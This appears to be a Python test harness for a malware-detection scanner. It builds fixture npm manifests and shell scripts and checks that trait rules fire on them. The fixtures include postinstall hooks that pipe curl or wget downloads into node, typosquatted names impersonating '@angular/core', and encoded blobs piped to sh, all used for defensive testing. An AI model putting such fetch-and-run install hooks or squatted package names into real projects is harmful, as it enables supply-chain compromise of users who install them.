#!/usr/bin/env python3
"""Check stdin flow and impersonation admission without executing fixtures."""
import os
from pathlib import Path
import subprocess
import tempfile
import json
import io
import tarfile

ROOT = Path(__file__).resolve().parents[3]
CURL = 'micro-behaviors/process/deploy/interpreter-stdin::npm-postinstall-curl-node-stdin'
WGET = 'micro-behaviors/process/deploy/interpreter-stdin::npm-postinstall-wget-node-stdin'
BRAND = 'objectives/supply-chain/impersonation/brand::angular-core-scoped-squat-remote-install'
ARCHIVE = 'objectives/command-and-control/dropper/interpreter-stdin::impersonated-package-archived-node-loader'
RULES = [CURL, WGET, BRAND, ARCHIVE]
PIPE = 'micro-behaviors/process/create/shell/pipeline::npm-postinstall-stdin-pipe'
PREPIPE = 'micro-behaviors/process/create/shell/pipeline::preinstall-pipe-node'
DEPENDENCY = 'metadata/package/dependencies/manifest/identity::npm-dep-modelcontextprotocol-server'
NAMING = 'metadata/file/naming::package-json-basename'
LEGACY = {
    'micro-behaviors/process/interpreter/node::npm-postinstall-stdin-pipe',
    'micro-behaviors/process/interpreter/node::preinstall-pipe-node',
    'metadata/import/package::dep-modelcontextprotocol-server',
    'metadata/package/files/included::package-json-basename',
}
URL = 'https://web.archive.org/web/https://example.org/source.js'

def manifest(command, name='fixture-installer', description='Fixture installer'):
    return {'name': name, 'version': '1.0.0', 'description': description,
            'scripts': {'postinstall': command}}

def impersonator(command, name='@anguar/core'):
    return manifest(command, name, 'Angular - the core framework')

cases = [
    ('ordinary installer', manifest(f'curl -L {URL} | node'), {CURL}),
    ('wget stdout', manifest(f'wget -qO - {URL} | node'), {WGET}),
    ('framework impersonator', impersonator(f'curl -L {URL} | node'), {CURL, BRAND, ARCHIVE}),
    ('renamed variant', impersonator(f'curl -fsSL {URL} | node', '@angjlar/core'), {CURL, BRAND, ARCHIVE}),
    ('direct source', impersonator('curl -L https://example.org/code.js | node'), {CURL, BRAND}),
    ('upstream package name', impersonator(f'curl -L {URL} | node', '@angular/core'), {CURL}),
    ('no framework claim', manifest(f'curl -L {URL} | node', '@anguar/core'), {CURL}),
    ('Node reads a file', impersonator(f'curl -L {URL} | node local.js'), set()),
    ('curl saves a file', impersonator(f'curl -o local.js {URL} | node'), set()),
    ('wget saves a file', impersonator(f'wget {URL} | node'), set()),
    ('unrelated pipeline', impersonator(f'curl {URL}; printf code | node'), set()),
    ('unrelated archive URL', impersonator(f'echo {URL}; curl https://example.org/code.js | node'), {CURL, BRAND}),
    ('quoted help', impersonator(f'echo "curl -L {URL} | node"'), set()),
    ('unrelated scope prefix', impersonator(f'curl -L {URL} | node', '@angijavascript/core'), {CURL}),
    ('extended scope', impersonator(f'curl -L {URL} | node', '@angjlarplugin/core'), {CURL}),
    ('transposed scope', impersonator(f'curl -L {URL} | node', '@angluar/core'), {CURL, BRAND, ARCHIVE}),
]

extra_cases = [
    ('Node stdin pipeline', manifest('printf code | node'), {PIPE, NAMING}),
    ('Node preinstall pipeline', {'scripts': {'preinstall': 'printf code | node'}}, {PREPIPE, NAMING}),
    ('Node executable name in data', manifest('echo "label|node=value"'), {NAMING}),
    ('runtime dependency', {'dependencies': {'@modelcontextprotocol/server': '^2.0.0'}}, {DEPENDENCY, NAMING}),
    ('development dependency', {'devDependencies': {'@modelcontextprotocol/server': '^2.0.0'}}, {DEPENDENCY, NAMING}),
    ('peer dependency', {'peerDependencies': {'@modelcontextprotocol/server': '^2.0.0'}}, {DEPENDENCY, NAMING}),
    ('optional dependency', {'optionalDependencies': {'@modelcontextprotocol/server': '^2.0.0'}}, {DEPENDENCY, NAMING}),
    ('unrelated property name', {'example': {'@modelcontextprotocol/server': '^2.0.0'}}, {NAMING}),
]
extra_rules = {PIPE, PREPIPE, DEPENDENCY, NAMING} | LEGACY
HEX = 'micro-behaviors/process/io/stream::hex-blob-piped-onward'
BASE64 = 'micro-behaviors/process/io/stream::base64-blob-piped-onward'
ENCODED = 'micro-behaviors/process/io/stream::encoded-blob-piped-onward'
SHELL = 'micro-behaviors/process/create/shell/pipeline::encoded-blob-piped-to-shell'
SUFFIX = 'metadata/file/extension/identity::js-min-or-map-basename'
source_rules = {HEX, BASE64, ENCODED, SHELL, SUFFIX,
                'metadata/file/naming::js-min-or-map-basename'}
source_rules |= {'micro-behaviors/process/create/shell/pipeline::' + name
                 for name in ['hex-blob-piped-onward', 'base64-blob-piped-onward',
                              'encoded-blob-piped-onward']}
hex_blob = '6563686f20636f6e74726f6c20646174610a'
base64_blob = 'VGhpcyBpcyBsb25nLCBub24tZXhlY3V0YWJsZSBjb250cm9sIGRhdGEuCg=='
source_cases = [
    ('hex.sh', f"echo '{hex_blob}' | xxd -r -p | cat\n", {HEX}),
    ('base64.sh', f"echo '{base64_blob}' | base64 -d | cat\n", {BASE64}),
    ('shell.sh', f"echo '{hex_blob}' | xxd -r -p | sh\n", {HEX, ENCODED, SHELL}),
    ('literal.sh', f"echo '{hex_blob}'\n", set()),
    ('text.sh', "printf 'ordinary text' | cat\n", set()),
    ('distant.sh', f"echo '{hex_blob}' | xxd -r -p | cat\n" + '\n' * 10 + 'printf text | sh\n', {HEX}),
    ('output.min.js', 'console.log("ordinary output");\n', {SUFFIX}),
    ('output.js', 'console.log("ordinary output");\n', set()),
]
with tempfile.TemporaryDirectory(prefix='npm-stdin-controls-') as tmp:
    expected_by_path = {}
    selected_cases = [(label, content, expected, set(RULES)) for label, content, expected in cases]
    selected_cases += [(label, content, expected, extra_rules) for label, content, expected in extra_cases]
    for index, (label, content, expected, selected) in enumerate(selected_cases):
        path = Path(tmp) / str(index) / 'package.json'
        path.parent.mkdir()
        path.write_text(json.dumps(content))
        expected_by_path[str(path)] = (label, expected, selected)

    for filename, content, expected in source_cases:
        path = Path(tmp) / filename
        path.write_text(content)
        expected_by_path[str(path)] = (filename, expected, source_rules)

    # Do not pool a lookalike's name/claim with another package's installer.
    for label, members, expected in [
        ('same manifest in archive', [impersonator(f'curl -L {URL} | node')], {CURL, BRAND, ARCHIVE}),
        ('different manifests in archive', [impersonator('echo ready'), manifest(f'curl -L {URL} | node')], {CURL}),
    ]:
        path = Path(tmp) / (label.replace(' ', '-') + '.tgz')
        with tarfile.open(path, 'w:gz') as archive:
            for index, content in enumerate(members):
                data = json.dumps(content).encode()
                entry = tarfile.TarInfo(f'package/{index}/package.json')
                entry.size = len(data)
                archive.addfile(entry, io.BytesIO(data))
        expected_by_path[str(path)] = (label, expected, set(RULES))
    result = subprocess.run([os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(ROOT),
                             '--format', 'json', tmp],
                            text=True, capture_output=True)
    assert result.returncode == 0, result.stderr
    decoder = json.JSONDecoder()
    remaining = result.stdout.strip()
    files = []
    while remaining:
        report, end = decoder.raw_decode(remaining)
        files.extend(report['files'])
        remaining = remaining[end:].lstrip()
    checked = set()
    for file in files:
        if file['path'] not in expected_by_path:
            continue
        label, expected, selected = expected_by_path[file['path']]
        actual = {trait['id'] for trait in file.get('traits', [])} & selected
        assert actual == expected, (label, expected, actual, result.stderr)
        checked.add(file['path'])
        print(f'PASS: {label}', flush=True)
    assert checked == set(expected_by_path), ('missing files', set(expected_by_path) - checked)
print(f'{len(expected_by_path)} controls passed')
